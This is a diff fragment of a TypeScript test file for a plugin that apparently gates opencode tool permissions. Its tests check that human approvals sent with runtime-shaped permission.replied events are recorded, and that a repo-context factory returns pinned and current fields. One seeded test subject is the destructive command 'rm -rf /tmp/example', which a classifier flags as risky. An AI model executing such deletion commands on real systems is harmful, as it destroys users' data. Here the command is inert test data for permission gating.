-    expect(normalizeRepliedProperties(42)).toBeNull()
-  })
-})
-
-describe("event hook wiring for permission.replied (runtime shape)", () => {
-  it("records a human approval when the event uses runtime field names (requestID/reply)", async () => {
-    // Reproduces the production bug: every permission.replied event we
-    // observed in opencode 1.4.x carries { sessionID, requestID, reply }
-    // rather than the SDK-declared { sessionID, permissionID, response }.
-    // Before this fix, the event-hook guard rejected them all as
-    // malformed and silently dropped every human approval.
-    const hooks = await makePluginHooks()
-    mockedHandle.mockClear()
-
-    // Seed a pending subject so the replied handler has something to record.
-    let capturedCtx: Parameters<typeof handlePermissionEvent>[1] | undefined
-    mockedHandle.mockImplementationOnce(async (_perm, ctx) => {
-      capturedCtx = ctx
-      ctx.pendingSubjects.set("perm_runtime_1", {
-        rootSessionID: "ses_test",
-        subject: "rm -rf /tmp/example",
-        subjectLabel: "command",
-        classifierVerdict: "RISKY",
-        classifierReason: "rm outside project",
-        autoApproved: false,
-      })
-    })
-
-    // Fire a permission.updated first so the ctx (and its stores) are
-    // captured for the test.
-    await hooks["permission.updated"]!(basePermission() as never)
-    expect(capturedCtx).toBeDefined()
-
-    // Now fire the runtime-shape permission.replied event.
-    await hooks["event"]!({
-      event: {
-        type: "permission.replied",
-        properties: {
-          sessionID: "ses_test",
-          requestID: "perm_runtime_1",
-          reply: "once",
+        {
+          type: "permission.asked",
+          data: { sessionID: ROOT, requestID: "perm_1", reply: "once" },
         },
-      },
-    } as never)
-
-    // The pending entry should have been taken (history recorded against
-    // the stored rootSessionID).
-    const entries = capturedCtx!.approvalHistory.recent("ses_test", 10)
-    expect(entries.length).toBe(1)
-    expect(entries[0]?.subject).toBe("rm -rf /tmp/example")
-    expect(entries[0]?.response).toBe("once")
-  })
-})
-
-describe("DualRepoContext factory wiring", () => {
-  beforeEach(() => {
-    mockedHandle.mockReset()
-    mockedHandle.mockImplementation(async () => {
-      // Default: no-op.
+      ],
     })
-  })
 
-  it("getRepoContext returns a DualRepoContext with pinned and current fields", async () => {
-    const hooks = await makePluginHooks()
-    await hooks["permission.updated"]!(basePermission() as never)
-    const ctx = mockedHandle.mock.calls[0]?.[1]
-    expect(typeof ctx?.getRepoContext).toBe("function")
-
-    // Calling it always returns an object with both keys (each may be
-    // null when the test environment isn't a git repo — what matters is
-    // the shape).
-    const dual = await ctx!.getRepoContext!()
-    expect(dual).not.toBeNull()
-    expect("pinned" in dual!).toBe(true)
-    expect("current" in dual!).toBe(true)
+    expect(ctx.approvalHistory.recent(ROOT, 10)).toEqual([])
+    // Untouched: the replied path never ran for those types.
+    expect(ctx.pendingSubjects.take(STATUS_KEY)).not.toBeNull()
   })
 })
